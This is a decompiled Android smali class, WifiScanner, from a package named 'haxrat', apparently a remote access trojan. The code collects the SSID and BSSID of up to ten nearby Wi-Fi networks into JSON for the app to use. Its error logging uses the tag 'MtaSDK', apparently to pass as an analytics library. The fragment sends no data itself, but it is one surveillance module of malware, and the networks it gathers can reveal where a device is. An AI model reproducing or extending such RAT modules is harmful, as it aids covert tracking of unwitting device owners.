.class public Lcom/hax4us/haxrat/WifiScanner;
.super Ljava/lang/Object;
.source "WifiScanner.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 42
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static scan(Landroid/content/Context;)Lorg/json/JSONObject;
    .locals 14

    .prologue
    .line 18
    move-object v0, p0

    :try_start_0
    new-instance v10, Lorg/json/JSONObject;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    invoke-direct {v11}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v10

    .line 19
    new-instance v10, Lorg/json/JSONArray;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    invoke-direct {v11}, Lorg/json/JSONArray;-><init>()V

    move-object v3, v10

    .line 20
    move-object v10, v0

    const-string v11, "wifi"

    invoke-virtual {v10, v11}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/net/wifi/WifiManager;

    move-object v4, v10

    .line 21
    move-object v10, v4

    if-eqz v10, :cond_2

    move-object v10, v4

    invoke-virtual {v10}, Landroid/net/wifi/WifiManager;->isWifiEnabled()Z

    move-result v10

    if-eqz v10, :cond_2

    .line 22
    move-object v10, v4

    invoke-virtual {v10}, Landroid/net/wifi/WifiManager;->getScanResults()Ljava/util/List;

    move-result-object v10

    move-object v5, v10

    .line 23
    move-object v10, v5

    if-eqz v10, :cond_2

    move-object v10, v5

    invoke-interface {v10}, Ljava/util/List;->size()I

    move-result v10

    const/4 v11, 0x0

    if-le v10, v11, :cond_2

    .line 24
    const/4 v10, 0x0

    move v6, v10

    .line 25
    :goto_0
    move v10, v6

    move-object v11, v5

    invoke-interface {v11}, Ljava/util/List;->size()I

    move-result v11

    if-ge v10, v11, :cond_0

    move v10, v6

    const/16 v11, 0xa

    if-lt v10, v11, :cond_1

    .line 33
    :cond_0
    move-object v10, v2

    const-string v11, "networks"

    move-object v12, v3

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    .line 34
    move-object v10, v2

    move-object v0, v10

    .line 40
    :goto_1
    return-object v0

    .line 26
    :cond_1
    move-object v10, v5

    move v11, v6

    invoke-interface {v10, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/net/wifi/ScanResult;

    move-object v7, v10

    .line 27
    new-instance v10, Lorg/json/JSONObject;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    invoke-direct {v11}, Lorg/json/JSONObject;-><init>()V

    move-object v8, v10

    .line 28
    move-object v10, v8

    const-string v11, "BSSID"

    move-object v12, v7

    iget-object v12, v12, Landroid/net/wifi/ScanResult;->BSSID:Ljava/lang/String;

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    .line 29
    move-object v10, v8

    const-string v11, "SSID"

    move-object v12, v7

    iget-object v12, v12, Landroid/net/wifi/ScanResult;->SSID:Ljava/lang/String;

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    .line 30
    move-object v10, v3

    move-object v11, v8

    invoke-virtual {v10, v11}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    .line 31
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 37
    :cond_2
    move-object v10, v2

    move-object v0, v10

    goto :goto_1

    :catch_0
    move-exception v10

    move-object v2, v10

    .line 39
    const-string v10, "MtaSDK"

    const-string v11, "isWifiNet error"

    move-object v12, v2

    invoke-static {v10, v11, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    move-result v10

    .line 40
    const/4 v10, 0x0

    check-cast v10, Lorg/json/JSONObject;

    move-object v0, v10

    goto :goto_1
.end method
